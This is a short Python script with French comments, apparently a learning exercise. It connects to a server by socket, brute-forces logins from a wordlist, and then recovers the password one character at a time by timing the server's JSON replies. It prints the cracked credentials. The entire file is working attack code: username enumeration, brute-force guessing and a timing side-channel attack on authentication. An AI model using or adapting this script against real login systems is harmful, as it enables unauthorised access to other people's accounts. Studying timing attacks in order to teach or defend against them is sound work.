import socket
import string
import sys
import itertools
import json
import datetime


# cette fonction reformate les elements d'une liste en supprimant le saut de ligne et renvoie la nouvelle valeur
def reformat(file):
    for line in file:
        line = line.strip("\n")
        login = str(line)
        yield login


# cette fonction isole lettre par lettre de la liste
def password_creation(liste):
    for i in range(1, 1000000): # permet d'avoir moins d1M de combinaisaons de caracteres possibles,
        for a in itertools.product(liste, repeat=i):
            word = str("".join(a))
            yield word


# cette fonction envoie un dictionnaire au serveur et retourne la réponse du serveur decryptée du Json
def send_response(login, password):
    dic = {'login': login, 'password': password}
    json_dict = json.dumps(dic)
    # envoi du dico au serveur
    start = datetime.datetime.now()
    client_socket.send(json_dict.encode())
    # reception de la réponse du serveur en Json
    response = client_socket.recv(1024)
    finish = datetime.datetime.now()
    difference = finish - start # calcul du temps que le serveur met pour repondre
    response = response.decode()
    # conversion du Json en python
    msg = json.loads(response)
    return msg, difference


# cette fonction teste les differents logins possibles tant que la reponse du serveur n'est pas "Wrong password""
def main(gen):
    while True:
        # recherche d'un login dans le fichier texte
        login = next(gen)
        msg, difference = send_response(login, " ")
        re = msg['result']
        if re == "Wrong login!":
            continue
        elif re == "Wrong password!": # login correct
            break
    password_test(login, "")


# cette fonction teste les differents mdp parmi l'alphabet et des nbr, majuscule ou min
def password_test(login, correct_mdp):
    alphabet = string.ascii_letters + string.digits
    generator = password_creation(alphabet)
    while True:
        i = next(generator)
        mdp = correct_mdp + i
        msg, difference = send_response(login, mdp)
        difference_in_ms = difference.total_seconds()
        re = msg['result']
        # si le mot testé est correcte, on continue
        if difference_in_ms > 0.09 and re == "Wrong password!":  # si la reponse du serveur est longue, cela signifie
            # qu'on a trouve le bon caractere
            password_test(login, mdp)
            break
        elif re == "Connection success!":  # si on a trouve le bon login/mdp
            correct_dic = {'login': login, 'password': mdp}
            print(json.dumps(correct_dic, indent=4))
            break


# creation d'un socket
client_socket = socket.socket()

# stocke les arguments de ligne de commande dans args
args = sys.argv

# connexion a un serveur
hostname = args[1]  # car 0 c'est le nom du scripte
port = int(args[2])
address = (hostname, port)
client_socket.connect(address)

# ouverture du fichier texte de loggin
my_file = open('/Users/estelle/Desktop/logins.txt', "r")
# transformation du fichier en une liste
file_list = my_file.readlines()
# on reformate les logins de la liste en str
gen = reformat(file_list)
# variable envoyee a la fonction principale
login_dict = {}
# appel de la fonction principale
main(gen)
# fermeture du fichier texte
my_file.close()
# fermeture du serveur
client_socket.close()
